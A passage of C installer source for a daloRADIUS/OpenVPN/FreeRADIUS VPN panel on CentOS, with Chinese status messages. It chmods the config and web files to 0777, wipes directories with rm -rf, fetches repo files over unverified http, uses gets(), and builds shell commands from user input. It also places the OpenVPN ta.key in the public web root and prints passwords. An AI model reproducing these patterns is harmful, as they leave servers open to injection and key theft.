	checkcode(runshell(2,"cp /Shirley/Source/dnsmasq.conf /etc/dnsmasq.conf"));
	checkcode(runshell(2,"chmod -R 0777 /etc/dnsmasq.conf"));
	checkcode(runshell(2,"chmod -R 0777 /Shirley/Shirley_Hosts"));
	
	
	
	printf("\n正在安装DALORADIUS-Panel...");
	checkcode(runshell(2,"ln -s /Shirley/bin/* /usr/bin/"));
	checkcode(runshell(2,"cp /Shirley/daloradius.service /lib/systemd/system/daloradius.service"));    
	checkcode(runshell(2,"cp /Shirley/openvpn-proxy.service /lib/systemd/system/openvpn-proxy.service"));    
	checkcode(runshell(2,"cp /Shirley/proxy.service /lib/systemd/system/proxy.service"));    
	checkcode(runshell(2,"systemctl daemon-reload >/dev/null 2>&1"));   //
	checkcode(runshell(2,"systemctl enable daloradius.service >/dev/null 2>&1"));   
	checkcode(runshell(2,"echo '/Shirley/Config/auto_run' >> /etc/rc.d/rc.local"));   
	checkcode(runshell(2,"chmod +x /etc/rc.d/rc.local")); 
	checkcode(runshell(2,"rm -rf /var/www/html/*"));
	checkcode(runshell(2,"cd /var/www/html/ && unzip /Shirley/Source/daloradius.zip >/dev/null 2>&1"));
	checkcode(runshell(2,"cd /var/www/html/ && unzip /Shirley/Source/phpMyAdmin.zip >/dev/null 2>&1"));
	checkcode(runshell(2,"cp /Shirley/Source/formwork.ovpn /var/www/html/formwork.ovpn"));
	checkcode(runshell(2,"cp /etc/openvpn/easy-rsa/keys/ca.crt /var/www/html/ca.crt"));
	checkcode(runshell(2,"cp /etc/openvpn/easy-rsa/keys/ta.key /var/www/html/ta.key"));
	checkcode(runshell(2,"chmod -R 0777 /var/www/html/*"));
	
	
	//Check database type
	//Shirley/Source/
	if (strcmp(Database_type,"Local_database")==0){
		//相同
		checkcode(runshell(2,"sed -i \"s/MySQL_Host/\"127.0.0.1\"/g\" /var/www/html/admin/library/daloradius.conf.php"));
		checkcode(runshell(2,"sed -i \"s/MySQL_Port/\"3306\"/g\" /var/www/html/admin/library/daloradius.conf.php"));
		checkcode(runshell(2,"sed -i \"s/MySQL_User/\"root\"/g\" /var/www/html/admin/library/daloradius.conf.php"));
		char Edit_RADIUS_database_Password[200];
		sprintf(Edit_RADIUS_database_Password,"sed -i \"s/MySQL_Pass/\"%s\"/g\" /var/www/html/admin/library/daloradius.conf.php",MySQL_Password);
		checkcode(runshell(2,Edit_RADIUS_database_Password));
    }else if (strcmp(Database_type,"Cloud_database")==0){
		//相同
		char Edit_RADIUS_database_Host[200];
		sprintf(Edit_RADIUS_database_Host,"sed -i \"s/MySQL_Host/\"%s\"/g\" /var/www/html/admin/library/daloradius.conf.php",MySQL_Host);
		checkcode(runshell(2,Edit_RADIUS_database_Host));
		
		char Edit_RADIUS_database_Port[200];
		sprintf(Edit_RADIUS_database_Port,"sed -i \"s/MySQL_Port/\"%s\"/g\" /var/www/html/admin/library/daloradius.conf.php",MySQL_Port);
		checkcode(runshell(2,Edit_RADIUS_database_Port));
		
		char Edit_RADIUS_database_Username[200];
		sprintf(Edit_RADIUS_database_Username,"sed -i \"s/MySQL_User/\"%s\"/g\" /var/www/html/admin/library/daloradius.conf.php",MySQL_Username);
		checkcode(runshell(2,Edit_RADIUS_database_Username));
		
		char Edit_RADIUS_database_Password[200];
		sprintf(Edit_RADIUS_database_Password,"sed -i \"s/MySQL_Pass/\"%s\"/g\" /var/www/html/admin/library/daloradius.conf.php",MySQL_Password);
		checkcode(runshell(2,Edit_RADIUS_database_Password));
	}else{
		printf("\n脚本错误，强制退出程序!!!");
		exit(1);
	}
	
	
	setbuf(stdout,NULL);
	system("vpn clean");
	setbuf(stdout,NULL);
	system("vpn restart");
	setbuf(stdout,NULL);
	system("clear");
	printf("\nDaloRadius系统安装完成，以下是您的安装信息");
	printf("\n---------------------------------------------------------------");
	printf("\n主要信息: ");
	printf("\n您的服务器信息如下：");
	if (strcmp(Database_type,"Local_database")==0){
		//相同
		printf("\n后台管理: %s:%s/admin",IP,WEB_Port);
		printf("\n后台账户: %s   后台密码: %s",WEB_Username,WEB_Password);
		printf("\n本机数据库管理: %s:%s/phpMyadmin",IP,WEB_Port);
		printf("\n本机数据库账户: root   本机数据库密码: %s",MySQL_Password);
    }else if (strcmp(Database_type,"Cloud_database")==0){
		//相同
		if (strcmp(Import_Database,"yes")==0){
			printf("\nRADIUS数据库文件已经导入至数据库，您可以正常使用。");
			printf("\n后台管理: %s:%s/admin",IP,WEB_Port);
			printf("\n后台账户: %s   后台密码: %s",WEB_Username,WEB_Password);
			printf("\n本机数据库管理: %s:%s/phpMyadmin",IP,WEB_Port);
			printf("\n本机数据库账户: root   本机数据库密码: %s",MySQL_Password);
			printf("\n云数据库地址: %s   云数据库端口: %s",MySQL_Host,MySQL_Port);
			printf("\n云数据库账户: %s   云数据库密码: %s",MySQL_Username,MySQL_Password);
		}else{
			printf("\n您选择不导入RADIUS数据库文件到您的云数据库，请及时导入数据库文件，否则无法使用，如果已有数据请忽略。");
			printf("\n后台管理: %s:%s/admin",IP,WEB_Port);
			printf("\n本机数据库管理: %s:%s/phpMyadmin",IP,WEB_Port);
			printf("\n本机数据库账户: root   本机数据库密码: %s",MySQL_Password);
			printf("\n云数据库地址: %s   云数据库端口: %s",MySQL_Host,MySQL_Port);
			printf("\n云数据库账户: %s   云数据库密码: %s",MySQL_Username,MySQL_Password);
		}
	}else{
		printf("\n脚本错误，强制退出程序!!!");
		exit(1);
	}
	
	printf("\n\n其他信息: ");
	printf("\n本系统已经不兼容老式DALO系统的证书和密钥，请使用新的证书和密钥，以下有示例模板");
	printf("\n线路模板: %s:%s/formwork.ovpn",IP,WEB_Port);  
	printf("\n线路证书: %s:%s/ca.crt",IP,WEB_Port);
	printf("\n线路密钥: %s:%s/ta.key",IP,WEB_Port);
	printf("\nVPN重启命令: vpn restart   OpenVPN开启端口命令: vpn port");
	printf("\nRadius负载命令: vpn radius");
	printf("\n此jio本由Shirley原创编写，感谢以下开源项目(daloradius、freeradius、openvpn)");
	printf("\n版本最后更新时间: %s",Last_update_time);
	printf("\n");
	printf("\n任何问题不要问我，不要问我，不要问我。");
	printf("\n任何问题不要问我，不要问我，不要问我。");
	printf("\n任何问题不要问我，不要问我，不要问我。");
	printf("\n---------------------------------------------------------------\n");
	exit(0);
}



void Uninstall()
{
	
	
	//卸载daloradius流控程序
	
	printf("\n暂未更新\n");
	exit(0);
	
	
	
}


void CentOS_Update()
{
	
	//CentOS系统更新
	
	
	setbuf(stdout,NULL);
	system("clear");
	
	
	printf("确定更新CentOS系统吗？此操作无法撤销，直接更新系统至最新版本[y/n]: ");
	char CentOS_Update_Option[20];
	gets(CentOS_Update_Option);
	if (strcmp(CentOS_Update_Option,"y")==0){
		//更换源
		checkcode(runshell(2,"rm -rf /etc/yum.repos.d/*"));
		checkcode(runshell(2,"wget --no-check-certificate -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo >/dev/null 2>&1"));
		//开始更新
		setbuf(stdout,NULL);
		system("yum clean all");
		setbuf(stdout,NULL);
		system("yum makecache");
		setbuf(stdout,NULL);
		system("yum -y install update");
		setbuf(stdout,NULL);
		system("yum -y install upgrade");
		setbuf(stdout,NULL);
		system("yum groupinstall -y Development tools");
		printf("\n更新完成。\n");
	}else{
		if (strcmp(CentOS_Update_Option,"Y")==0){
			//更换源
			checkcode(runshell(2,"rm -rf /etc/yum.repos.d/CentOS-Base.repo"));
			checkcode(runshell(2,"wget --no-check-certificate -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo >/dev/null 2>&1"));
			//开始更新
			setbuf(stdout,NULL);
			system("yum clean all");
			setbuf(stdout,NULL);
			system("yum makecache");
			setbuf(stdout,NULL);
			system("yum -y install update");
			setbuf(stdout,NULL);
			system("yum -y install upgrade");
			setbuf(stdout,NULL);
			system("yum groupinstall -y Development tools");
			printf("\n更新完成。\n");
		}else{
			printf("\n用户选择不更新，程序结束!!!\n");
			exit(0);
		}
	}
}


char* cmd_system(char* command)
{
    memset(buff, 0, sizeof(buff));
    return shellcmd(command, buff, sizeof(buff));
}









